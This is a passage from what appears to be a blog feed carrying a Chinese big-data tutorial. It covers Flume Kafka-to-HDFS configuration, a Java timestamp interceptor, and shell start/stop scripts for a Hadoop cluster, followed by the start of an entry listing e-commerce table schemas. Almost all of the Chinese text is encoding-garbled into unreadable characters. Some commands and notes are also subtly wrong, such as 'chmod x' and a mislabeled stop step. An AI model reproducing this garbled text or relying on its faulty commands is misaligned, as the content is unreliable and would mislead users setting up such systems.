é‡‡é›†flumeâ€”â€”-â€œ</p><p>ssh $i â€œps -ef | grep file_to_kafka.conf | grep -v grep |awk â€˜{print \$2}â€™<br>| xargs -n1 kill -9 â€œ</p><p>done</p><p>};;</p><p>esac</p><p><strong>2ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod x f1.sh</p><p><strong>3ï¼‰f1å¯åŠ¨</strong></p><p>[atguigu@hadoop102 module]$ f1.sh start</p><p><strong>4ï¼‰f2åœæ­¢</strong></p><p>[atguigu@hadoop102 module]$ f1.sh stop</p><h3 id="æ—¥å¿—æ¶ˆè´¹Flume"><a href="#æ—¥å¿—æ¶ˆè´¹Flume" class="headerlink" title="æ—¥å¿—æ¶ˆè´¹Flume"></a>æ—¥å¿—æ¶ˆè´¹Flume</h3><h4 id="æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®æ¦‚è¿°"><a href="#æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®æ¦‚è¿°" class="headerlink" title="æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®æ¦‚è¿°"></a>æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®æ¦‚è¿°</h4><p>æŒ‰ç…§è§„åˆ’ï¼Œè¯¥Flumeéœ€å°†Kafkaä¸­topic_logçš„æ•°æ®å‘å¾€HDFSã€‚å¹¶ä¸”å¯¹æ¯å¤©äº§ç”Ÿçš„ç”¨æˆ·è¡Œä¸ºæ—¥å¿—è¿›è¡ŒåŒºåˆ†ï¼Œå°†ä¸åŒå¤©çš„æ•°æ®å‘å¾€HDFSä¸åŒå¤©çš„è·¯å¾„ã€‚</p><p>æ­¤å¤„é€‰æ‹©KafkaSourceã€FileChannelã€HDFSSinkã€‚</p><p>å…³é”®é…ç½®å¦‚ä¸‹ï¼š</p><h4 id="æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®å®æ“"><a href="#æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®å®æ“" class="headerlink" title="æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®å®æ“"></a>æ—¥å¿—æ¶ˆè´¹Flumeé…ç½®å®æ“</h4><p><strong>1ï¼‰åˆ›å»ºFlumeé…ç½®æ–‡ä»¶</strong></p><p>åœ¨hadoop104èŠ‚ç‚¹çš„Flumeçš„jobç›®å½•ä¸‹åˆ›å»ºkafka_to_hdfs.conf</p><p>[atguigu@hadoop104 flume]$ mkdir job</p><p>[atguigu@hadoop104 flume]$ vim job/kafka_to_hdfs.conf</p><p><strong>2ï¼‰é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹</strong></p><p>#### ç»„ä»¶</p><p>a1.sources=r1</p><p>a1.channels=c1</p><p>a1.sinks=k1</p><p>#### source1</p><p>a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource</p><p>a1.sources.r1.batchSize = 5000</p><p>a1.sources.r1.batchDurationMillis = 2000</p><p>a1.sources.r1.kafka.bootstrap.servers =<br>hadoop102:9092,hadoop103:9092,hadoop104:9092</p><p>a1.sources.r1.kafka.topics=topic_log</p><p>a1.sources.r1.interceptors = i1</p><p>a1.sources.r1.interceptors.i1.type =<br>com.atguigu.flume.interceptor.TimestampInterceptor$Builder</p><p>#### channel1</p><p>a1.channels.c1.type = file</p><p>a1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior1</p><p>a1.channels.c1.dataDirs = /opt/module/flume/data/behavior1/</p><p>a1.channels.c1.maxFileSize = 2146435071</p><p>a1.channels.c1.capacity = 1000000</p><p>a1.channels.c1.keep-alive = 6</p><p>#### sink1</p><p>a1.sinks.k1.type = hdfs</p><p>a1.sinks.k1.hdfs.path = /origin_data/gmall/log/topic_log/%Y-%m-%d</p><p>a1.sinks.k1.hdfs.filePrefix = log-</p><p>a1.sinks.k1.hdfs.rollInterval = 10</p><p>a1.sinks.k1.hdfs.rollSize = 134217728</p><p>a1.sinks.k1.hdfs.rollCount = 0</p><p>#### æ§åˆ¶è¾“å‡ºæ–‡ä»¶æ˜¯åŸç”Ÿæ–‡ä»¶ã€‚</p><p>a1.sinks.k1.hdfs.fileType = CompressedStream</p><p>a1.sinks.k1.hdfs.codeC = gzip</p><p>#### æ‹¼è£…</p><p>a1.sources.r1.channels = c1</p><p>a1.sinks.k1.channel= c1</p><p><strong>æ³¨ï¼šé…ç½®ä¼˜åŒ–</strong></p><p>1ï¼‰FileChannelä¼˜åŒ–</p><p>é€šè¿‡é…ç½®dataDirsæŒ‡å‘å¤šä¸ªè·¯å¾„ï¼Œæ¯ä¸ªè·¯å¾„å¯¹åº”ä¸åŒçš„ç¡¬ç›˜ï¼Œå¢å¤§Flumeååé‡ã€‚</p><p>å®˜æ–¹è¯´æ˜å¦‚ä¸‹ï¼š</p><p>Comma separated list of directories for storing log files. Using multiple<br>directories on separate disks can improve file channel peformance</p><p>checkpointDirå’ŒbackupCheckpointDirä¹Ÿå°½é‡é…ç½®åœ¨ä¸åŒç¡¬ç›˜å¯¹åº”çš„ç›®å½•ä¸­ï¼Œä¿è¯checkpointåæ‰åï¼Œå¯ä»¥å¿«é€Ÿä½¿ç”¨backupCheckpointDiræ¢å¤æ•°æ®</p><p>2ï¼‰HDFS Sinkä¼˜åŒ–</p><p>ï¼ˆ1ï¼‰HDFSå­˜å…¥å¤§é‡å°æ–‡ä»¶ï¼Œæœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</p><p><strong>å…ƒæ•°æ®å±‚é¢ï¼š</strong>æ¯ä¸ªå°æ–‡ä»¶éƒ½æœ‰ä¸€ä»½å…ƒæ•°æ®ï¼Œå…¶ä¸­åŒ…æ‹¬æ–‡ä»¶è·¯å¾„ï¼Œæ–‡ä»¶åï¼Œæ‰€æœ‰è€…ï¼Œæ‰€å±ç»„ï¼Œæƒé™ï¼Œåˆ›å»ºæ—¶é—´ç­‰ï¼Œè¿™äº›ä¿¡æ¯éƒ½ä¿å­˜åœ¨Namenodeå†…å­˜ä¸­ã€‚æ‰€ä»¥å°æ–‡ä»¶è¿‡å¤šï¼Œä¼šå ç”¨NamenodeæœåŠ¡å™¨å¤§é‡å†…å­˜ï¼Œå½±å“Namenodeæ€§èƒ½å’Œä½¿ç”¨å¯¿å‘½</p><p><strong>è®¡ç®—å±‚é¢ï¼š</strong>é»˜è®¤æƒ…å†µä¸‹MRä¼šå¯¹æ¯ä¸ªå°æ–‡ä»¶å¯ç”¨ä¸€ä¸ªMapä»»åŠ¡è®¡ç®—ï¼Œéå¸¸å½±å“è®¡ç®—æ€§èƒ½ã€‚åŒæ—¶ä¹Ÿå½±å“ç£ç›˜å¯»å€æ—¶é—´ã€‚</p><p>ï¼ˆ2ï¼‰HDFSå°æ–‡ä»¶å¤„ç†</p><p>å®˜æ–¹é»˜è®¤çš„è¿™ä¸‰ä¸ªå‚æ•°é…ç½®å†™å…¥HDFSåä¼šäº§ç”Ÿå°æ–‡ä»¶ï¼Œhdfs.rollIntervalã€hdfs.rollSizeã€hdfs.rollCount</p><p>åŸºäºä»¥ä¸Šhdfs.rollInterval=3600ï¼Œhdfs.rollSize=134217728ï¼Œhdfs.rollCount<br>=0å‡ ä¸ªå‚æ•°ç»¼åˆä½œç”¨ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p>ï¼ˆ1ï¼‰æ–‡ä»¶åœ¨è¾¾åˆ°128Mæ—¶ä¼šæ»šåŠ¨ç”Ÿæˆæ–°æ–‡ä»¶</p><p>ï¼ˆ2ï¼‰æ–‡ä»¶åˆ›å»ºè¶…3600ç§’æ—¶ä¼šæ»šåŠ¨ç”Ÿæˆæ–°æ–‡ä»¶</p><p><strong>3ï¼‰ç¼–å†™Flumeæ‹¦æˆªå™¨</strong></p><p>ï¼ˆ1ï¼‰åœ¨com.atguigu.flume.interceptoråŒ…ä¸‹åˆ›å»ºTimeStampInterceptorç±»</p><p>package com.atguigu.flume.interceptor;</p><p>import com.alibaba.fastjson.JSONObject;</p><p>import org.apache.flume.Context;</p><p>import org.apache.flume.Event;</p><p>import org.apache.flume.interceptor.Interceptor;</p><p>import java.nio.charset.StandardCharsets;</p><p>import java.util.List;</p><p>import java.util.Map;</p><p>public class TimeStampInterceptor implements Interceptor {</p><p>@Override</p><p>public void initialize() {</p><p>}</p><p>@Override</p><p>public Event intercept(Event event) {</p><p>Map&lt;String, String&gt; headers = event.getHeaders();</p><p>String log = new String(event.getBody(), StandardCharsets.UTF_8);</p><p>JSONObject jsonObject = JSONObject.parseObject(log);</p><p>String ts = jsonObject.getString(â€œtsâ€);</p><p>headers.put(â€œtimestampâ€, ts);</p><p>return event;</p><p>}</p><p>@Override</p><p>public List&lt;Event&gt; intercept(List&lt;Event&gt; events) {</p><p>for (Event event : events) {</p><p>intercept(event);</p><p>}</p><p>return events;</p><p>}</p><p>@Override</p><p>public void close() {</p><p>}</p><p>public static class Builder implements Interceptor.Builder {</p><p>@Override</p><p>public Interceptor build() {</p><p>return new TimeStampInterceptor();</p><p>}</p><p>@Override</p><p>public void configure(Context context) {</p><p>}</p><p>}</p><p>}</p><p>ï¼ˆ2ï¼‰é‡æ–°æ‰“åŒ…</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/361c38002f9891ce01e4771948d70b01.png" alt="å›¾ç‰‡åŒ…å« å›¾å½¢ç”¨æˆ·ç•Œé¢æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>3ï¼‰éœ€è¦å…ˆå°†æ‰“å¥½çš„åŒ…æ”¾å…¥åˆ°hadoop104çš„/opt/module/flume/libæ–‡ä»¶å¤¹ä¸‹é¢ã€‚</p><h4 id="æ—¥å¿—æ¶ˆè´¹Flumeæµ‹è¯•"><a href="#æ—¥å¿—æ¶ˆè´¹Flumeæµ‹è¯•" class="headerlink" title="æ—¥å¿—æ¶ˆè´¹Flumeæµ‹è¯•"></a>æ—¥å¿—æ¶ˆè´¹Flumeæµ‹è¯•</h4><p><strong>1ï¼‰å¯åŠ¨Zookeeperã€Kafkaé›†ç¾¤</strong></p><p><strong>2ï¼‰å¯åŠ¨æ—¥å¿—é‡‡é›†Flume</strong></p><p>[atguigu@hadoop102 ~]$ f1.sh start</p><p><strong>3ï¼‰å¯åŠ¨hadoop104çš„æ—¥å¿—æ¶ˆè´¹Flume</strong></p><p>[atguigu@hadoop104 flume]$ bin/flume-ng agent -n a1 -c conf/ -f<br>job/kafka_to_hdfs.conf -Dflume.root.logger=info,console</p><p><strong>4ï¼‰ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®</strong></p><p>[atguigu@hadoop102 ~]$ lg.sh</p><p><strong>5ï¼‰è§‚å¯ŸHDFSæ˜¯å¦å‡ºç°æ•°æ®</strong></p><h4 id="æ—¥å¿—æ¶ˆè´¹Flumeå¯åœè„šæœ¬"><a href="#æ—¥å¿—æ¶ˆè´¹Flumeå¯åœè„šæœ¬" class="headerlink" title="æ—¥å¿—æ¶ˆè´¹Flumeå¯åœè„šæœ¬"></a>æ—¥å¿—æ¶ˆè´¹Flumeå¯åœè„šæœ¬</h4><p>è‹¥ä¸Šè¿°æµ‹è¯•é€šè¿‡ï¼Œä¸ºæ–¹ä¾¿ï¼Œæ­¤å¤„åˆ›å»ºä¸€ä¸ªFlumeçš„å¯åœè„šæœ¬ã€‚</p><p><strong>1ï¼‰åœ¨hadoop102èŠ‚ç‚¹çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬f2.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim f2.sh</p><p>åœ¨è„šæœ¬ä¸­å¡«å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>case $1 in</p><p>â€œstartâ€)</p><p>echo â€œ â€”â€”â€“å¯åŠ¨ hadoop104 æ—¥å¿—æ•°æ®flumeâ€”â€”-â€œ</p><p>ssh hadoop104 â€œnohup /opt/module/flume/bin/flume-ng agent -n a1 -c<br>/opt/module/flume/conf -f /opt/module/flume/job/kafka_to_hdfs.conf &gt;/dev/null<br>2&gt;&amp;1 &amp;â€</p><p>;;</p><p>â€œstopâ€)</p><p>echo â€œ â€”â€”â€“åœæ­¢ hadoop104 æ—¥å¿—æ•°æ®flumeâ€”â€”-â€œ</p><p>ssh hadoop104 â€œps -ef | grep kafka_to_hdfs.conf | grep -v grep |awk â€˜{print<br>\$2}â€™ | xargs -n1 killâ€</p><p>;;</p><p>esac</p><p><strong>2ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x f2.sh</p><p><strong>3ï¼‰f2å¯åŠ¨</strong></p><p>[atguigu@hadoop102 module]$ f2.sh start</p><p><strong>4ï¼‰f2åœæ­¢</strong></p><p>[atguigu@hadoop102 module]$ f2.sh stop</p><h3 id="é‡‡é›†é€šé“å¯åŠ¨-åœæ­¢è„šæœ¬"><a href="#é‡‡é›†é€šé“å¯åŠ¨-åœæ­¢è„šæœ¬" class="headerlink" title="é‡‡é›†é€šé“å¯åŠ¨/åœæ­¢è„šæœ¬"></a>é‡‡é›†é€šé“å¯åŠ¨/åœæ­¢è„šæœ¬</h3><p>1ï¼‰åœ¨/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬cluster.sh</p><p>[atguigu@hadoop102 bin]$ vim cluster.sh</p><p>åœ¨è„šæœ¬ä¸­å¡«å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>case $1 in</p><p>â€œstartâ€){</p><p>echo ================== å¯åŠ¨ é›†ç¾¤ ==================</p><p>##å¯åŠ¨ Zookeeperé›†ç¾¤</p><p>zk.sh start</p><p>##å¯åŠ¨ Hadoopé›†ç¾¤</p><p>myhadoop.sh start</p><p>##å¯åŠ¨ Kafkaé‡‡é›†é›†ç¾¤</p><p>kf.sh start</p><p>##å¯åŠ¨ Flumeé‡‡é›†é›†ç¾¤</p><p>f1.sh start</p><p>##å¯åŠ¨ Flumeæ¶ˆè´¹é›†ç¾¤</p><p>f2.sh start</p><p>};;</p><p>â€œstopâ€){</p><p>echo ================== åœæ­¢ é›†ç¾¤ ==================</p><p>##åœæ­¢ Flumeæ¶ˆè´¹é›†ç¾¤</p><p>f2.sh stop</p><p>##åœæ­¢ Flumeé‡‡é›†é›†ç¾¤</p><p>f1.sh stop</p><p>##åœæ­¢ Kafkaé‡‡é›†é›†ç¾¤</p><p>kf.sh stop</p><p>##åœæ­¢ Hadoopé›†ç¾¤</p><p>myhadoop.sh stop</p><p>##åœæ­¢ Zookeeperé›†ç¾¤</p><p>zk.sh stop</p><p>};;</p><p>esac</p><p>2ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x cluster.sh</p><p>3ï¼‰clusteré›†ç¾¤å¯åŠ¨è„šæœ¬</p><p>[atguigu@hadoop102 module]$ cluster.sh start</p><p>4ï¼‰clusteré›†ç¾¤åœæ­¢è„šæœ¬</p><p>[atguigu@hadoop102 module]$ cluster.sh stop</p>]]></content>
      
      
      <categories>
          
          <category> é¡¹ç›® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ä»“åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°šç¡…è°·å¤§æ•°æ®é¡¹ç›®ä¹‹ç”µå•†æ•°ä»“ï¼ˆä¸šåŠ¡æ•°æ®é‡‡é›†å¹³å°ï¼‰V5.0</title>
      <link href="/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/"/>
      <url>/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/</url>
      
        <content type="html"><![CDATA[<p>å°šç¡…è°·å¤§æ•°æ®é¡¹ç›®ä¹‹ç”µå•†æ•°ä»“ï¼ˆä¸šåŠ¡æ•°æ®é‡‡é›†å¹³å°ï¼‰</p><p>(ä½œè€…ï¼šå°šç¡…è°·å¤§æ•°æ®ç ”å‘éƒ¨)</p><p>ç‰ˆæœ¬ï¼šV5.0</p><h2 id="ç¬¬1ç« -ç”µå•†ä¸šåŠ¡ç®€ä»‹"><a href="#ç¬¬1ç« -ç”µå•†ä¸šåŠ¡ç®€ä»‹" class="headerlink" title="ç¬¬1ç«  ç”µå•†ä¸šåŠ¡ç®€ä»‹"></a>ç¬¬1ç«  ç”µå•†ä¸šåŠ¡ç®€ä»‹</h2><h3 id="ç”µå•†ä¸šåŠ¡æµç¨‹"><a href="#ç”µå•†ä¸šåŠ¡æµç¨‹" class="headerlink" title="ç”µå•†ä¸šåŠ¡æµç¨‹"></a>ç”µå•†ä¸šåŠ¡æµç¨‹</h3><p>ç”µå•†çš„ä¸šåŠ¡æµç¨‹å¯ä»¥ä»¥ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„æµè§ˆè¶³è¿¹ä¸ºä¾‹è¿›è¡Œè¯´æ˜ï¼Œç”¨æˆ·ç‚¹å¼€ç”µå•†é¦–é¡µå¼€å§‹æµè§ˆï¼Œå¯èƒ½ä¼šé€šè¿‡åˆ†ç±»æŸ¥è¯¢ä¹Ÿå¯èƒ½é€šè¿‡å…¨æ–‡æœç´¢å¯»æ‰¾è‡ªå·±ä¸­æ„çš„å•†å“ï¼Œè¿™äº›å•†å“æ— ç–‘éƒ½æ˜¯å­˜å‚¨åœ¨åå°çš„ç®¡ç†ç³»ç»Ÿä¸­çš„ã€‚</p><p>å½“ç”¨æˆ·å¯»æ‰¾åˆ°è‡ªå·±ä¸­æ„çš„å•†å“ï¼Œå¯èƒ½ä¼šæƒ³è¦è´­ä¹°ï¼Œå°†å•†å“æ·»åŠ åˆ°è´­ç‰©è½¦åå‘ç°éœ€è¦ç™»å½•ï¼Œç™»å½•åå¯¹å•†å“è¿›è¡Œç»“ç®—ï¼Œè¿™æ—¶å€™è´­ç‰©è½¦çš„ç®¡ç†å’Œå•†å“è®¢å•ä¿¡æ¯çš„ç”Ÿæˆéƒ½ä¼šå¯¹ä¸šåŠ¡æ•°æ®åº“äº§ç”Ÿå½±å“ï¼Œä¼šç”Ÿæˆç›¸åº”çš„è®¢å•æ•°æ®å’Œæ”¯ä»˜æ•°æ®ã€‚</p><p>è®¢å•æ­£å¼ç”Ÿæˆä¹‹åï¼Œè¿˜ä¼šå¯¹è®¢å•è¿›è¡Œè·Ÿè¸ªå¤„ç†ï¼Œç›´åˆ°è®¢å•å…¨éƒ¨å®Œæˆã€‚</p><p>ç”µå•†çš„ä¸»è¦ä¸šåŠ¡æµç¨‹åŒ…æ‹¬ç”¨æˆ·å‰å°æµè§ˆå•†å“æ—¶çš„å•†å“è¯¦æƒ…çš„ç®¡ç†ï¼Œç”¨æˆ·å•†å“åŠ å…¥è´­ç‰©è½¦è¿›è¡Œæ”¯ä»˜æ—¶ç”¨æˆ·ä¸ªäººä¸­å¿ƒ&amp;æ”¯ä»˜æœåŠ¡çš„ç®¡ç†ï¼Œç”¨æˆ·æ”¯ä»˜å®Œæˆåè®¢å•åå°æœåŠ¡çš„ç®¡ç†ï¼Œè¿™äº›æµç¨‹æ¶‰åŠåˆ°äº†åå‡ ä¸ªç”šè‡³å‡ åä¸ªä¸šåŠ¡æ•°æ®è¡¨ï¼Œç”šè‡³æ›´å¤šã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/e9ecb894ec58b2efc013bb4e9c5088a0.jpeg"></p><h3 id="ç”µå•†å¸¸è¯†"><a href="#ç”µå•†å¸¸è¯†" class="headerlink" title="ç”µå•†å¸¸è¯†"></a>ç”µå•†å¸¸è¯†</h3><h4 id="SKUå’ŒSPU"><a href="#SKUå’ŒSPU" class="headerlink" title="SKUå’ŒSPU"></a>SKUå’ŒSPU</h4><p>SKU=Stock Keeping<br>Unitï¼ˆåº“å­˜é‡åŸºæœ¬å•ä½ï¼‰ã€‚ç°åœ¨å·²ç»è¢«å¼•ç”³ä¸ºäº§å“ç»Ÿä¸€ç¼–å·çš„ç®€ç§°ï¼Œæ¯ç§äº§å“å‡å¯¹åº”æœ‰å”¯ä¸€çš„SKUå·ã€‚</p><p>SPUï¼ˆStandard Product<br>Unitï¼‰ï¼šæ˜¯å•†å“ä¿¡æ¯èšåˆçš„æœ€å°å•ä½ï¼Œæ˜¯ä¸€ç»„å¯å¤ç”¨ã€æ˜“æ£€ç´¢çš„æ ‡å‡†åŒ–ä¿¡æ¯é›†åˆã€‚</p><p>ä¾‹å¦‚ï¼šiPhoneXæ‰‹æœºå°±æ˜¯SPUã€‚ä¸€å°é“¶è‰²ã€128Gå†…å­˜çš„ã€æ”¯æŒè”é€šç½‘ç»œçš„iPhoneXï¼Œå°±æ˜¯SKUã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/024d35ea94cc5e0654eed23f45079247.png"></p><p>SPUè¡¨ç¤ºä¸€ç±»å•†å“ã€‚åŒä¸€SPUçš„å•†å“å¯ä»¥å…±ç”¨å•†å“å›¾ç‰‡ã€æµ·æŠ¥ã€é”€å”®å±æ€§ç­‰ã€‚</p><h4 id="å¹³å°å±æ€§å’Œé”€å”®å±æ€§"><a href="#å¹³å°å±æ€§å’Œé”€å”®å±æ€§" class="headerlink" title="å¹³å°å±æ€§å’Œé”€å”®å±æ€§"></a>å¹³å°å±æ€§å’Œé”€å”®å±æ€§</h4><p><strong>1.å¹³å°å±æ€§</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/8795580dd3db783c3cd0b15197cf94fa.png"></p><p><strong>2.é”€å”®å±æ€§</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/0da04f4fa079a4754c9bd33e30eae808.png"></p><h2 id="ç¬¬2ç« -ç”µå•†ä¸šåŠ¡æ•°æ®"><a href="#ç¬¬2ç« -ç”µå•†ä¸šåŠ¡æ•°æ®" class="headerlink" title="ç¬¬2ç«  ç”µå•†ä¸šåŠ¡æ•°æ®"></a>ç¬¬2ç«  ç”µå•†ä¸šåŠ¡æ•°æ®</h2><h3 id="ç”µå•†ç³»ç»Ÿè¡¨ç»“æ„"><a href="#ç”µå•†ç³»ç»Ÿè¡¨ç»“æ„" class="headerlink" title="ç”µå•†ç³»ç»Ÿè¡¨ç»“æ„"></a>ç”µå•†ç³»ç»Ÿè¡¨ç»“æ„</h3><p>ä»¥ä¸‹ä¸ºæœ¬ç”µå•†æ•°ä»“ç³»ç»Ÿæ¶‰åŠåˆ°çš„ä¸šåŠ¡æ•°æ®è¡¨ç»“æ„å…³ç³»ã€‚è¿™34ä¸ªè¡¨ä»¥è®¢å•è¡¨ã€ç”¨æˆ·è¡¨ã€SKUå•†å“è¡¨ã€æ´»åŠ¨è¡¨å’Œä¼˜æƒ åˆ¸è¡¨ä¸ºä¸­å¿ƒï¼Œå»¶ä¼¸å‡ºäº†ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ã€æ”¯ä»˜æµæ°´è¡¨ã€æ´»åŠ¨è®¢å•è¡¨ã€è®¢å•è¯¦æƒ…è¡¨ã€è®¢å•çŠ¶æ€è¡¨ã€å•†å“è¯„è®ºè¡¨ã€ç¼–ç å­—å…¸è¡¨é€€å•è¡¨ã€SPUå•†å“è¡¨ç­‰ï¼Œç”¨æˆ·è¡¨æä¾›ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯ä»˜æµæ°´è¡¨æä¾›è¯¥è®¢å•çš„æ”¯ä»˜è¯¦æƒ…ï¼Œè®¢å•è¯¦æƒ…è¡¨æä¾›è®¢å•çš„å•†å“æ•°é‡ç­‰æƒ…å†µï¼Œå•†å“è¡¨ç»™è®¢å•è¯¦æƒ…è¡¨æä¾›å•†å“çš„è¯¦ç»†ä¿¡æ¯ã€‚æœ¬æ¬¡è®²è§£ä»¥æ­¤34ä¸ªè¡¨ä¸ºä¾‹ï¼Œå®é™…é¡¹ç›®ä¸­ï¼Œä¸šåŠ¡æ•°æ®åº“ä¸­è¡¨æ ¼è¿œè¿œä¸æ­¢è¿™äº›ã€‚</p><h4 id="æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆactivity-infoï¼‰"><a href="#æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆactivity-infoï¼‰" class="headerlink" title="æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆactivity_infoï¼‰"></a>æ´»åŠ¨ä¿¡æ¯è¡¨ï¼ˆactivity_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>æ´»åŠ¨id</td></tr><tr><td>activity_name</td><td>æ´»åŠ¨åç§°</td></tr><tr><td>activity_type</td><td>æ´»åŠ¨ç±»å‹ï¼ˆ1ï¼šæ»¡å‡ï¼Œ2ï¼šæŠ˜æ‰£ï¼‰</td></tr><tr><td>activity_desc</td><td>æ´»åŠ¨æè¿°</td></tr><tr><td>start_time</td><td>å¼€å§‹æ—¶é—´</td></tr><tr><td>end_time</td><td>ç»“æŸæ—¶é—´</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr></tbody></table><h4 id="æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆactivity-ruleï¼‰"><a href="#æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆactivity-ruleï¼‰" class="headerlink" title="æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆactivity_ruleï¼‰"></a>æ´»åŠ¨è§„åˆ™è¡¨ï¼ˆactivity_ruleï¼‰</h4><table><thead><tr><th>id</th><th>ç¼–å·</th></tr></thead><tbody><tr><td>activity_id</td><td>æ´»åŠ¨ID</td></tr><tr><td>activity_type</td><td>æ´»åŠ¨ç±»å‹</td></tr><tr><td>condition_amount</td><td>æ»¡å‡é‡‘é¢</td></tr><tr><td>condition_num</td><td>æ»¡å‡ä»¶æ•°</td></tr><tr><td>benefit_amount</td><td>ä¼˜æƒ é‡‘é¢</td></tr><tr><td>benefit_discount</td><td>ä¼˜æƒ æŠ˜æ‰£</td></tr><tr><td>benefit_level</td><td>ä¼˜æƒ çº§åˆ«</td></tr></tbody></table><h4 id="æ´»åŠ¨å•†å“å…³è”è¡¨ï¼ˆactivity-skuï¼‰"><a href="#æ´»åŠ¨å•†å“å…³è”è¡¨ï¼ˆactivity-skuï¼‰" class="headerlink" title="æ´»åŠ¨å•†å“å…³è”è¡¨ï¼ˆactivity_skuï¼‰"></a>æ´»åŠ¨å•†å“å…³è”è¡¨ï¼ˆactivity_skuï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>activity_id</td><td>æ´»åŠ¨id</td></tr><tr><td>sku_id</td><td>sku_id</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr></tbody></table><h4 id="å¹³å°å±æ€§è¡¨ï¼ˆbase-attr-infoï¼‰"><a href="#å¹³å°å±æ€§è¡¨ï¼ˆbase-attr-infoï¼‰" class="headerlink" title="å¹³å°å±æ€§è¡¨ï¼ˆbase_attr_infoï¼‰"></a>å¹³å°å±æ€§è¡¨ï¼ˆbase_attr_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>attr_name</td><td>å±æ€§åç§°</td></tr><tr><td>category_id</td><td>åˆ†ç±»id</td></tr><tr><td>category_level</td><td>åˆ†ç±»å±‚çº§</td></tr></tbody></table><h4 id="å¹³å°å±æ€§å€¼è¡¨ï¼ˆbase-attr-valueï¼‰"><a href="#å¹³å°å±æ€§å€¼è¡¨ï¼ˆbase-attr-valueï¼‰" class="headerlink" title="å¹³å°å±æ€§å€¼è¡¨ï¼ˆbase_attr_valueï¼‰"></a>å¹³å°å±æ€§å€¼è¡¨ï¼ˆbase_attr_valueï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>value_name</td><td>å±æ€§å€¼åç§°</td></tr><tr><td>attr_id</td><td>å±æ€§id</td></tr></tbody></table><h4 id="ä¸€çº§åˆ†ç±»è¡¨ï¼ˆbase-category1ï¼‰"><a href="#ä¸€çº§åˆ†ç±»è¡¨ï¼ˆbase-category1ï¼‰" class="headerlink" title="ä¸€çº§åˆ†ç±»è¡¨ï¼ˆbase_category1ï¼‰"></a>ä¸€çº§åˆ†ç±»è¡¨ï¼ˆbase_category1ï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>name</td><td>åˆ†ç±»åç§°</td></tr></tbody></table><h4 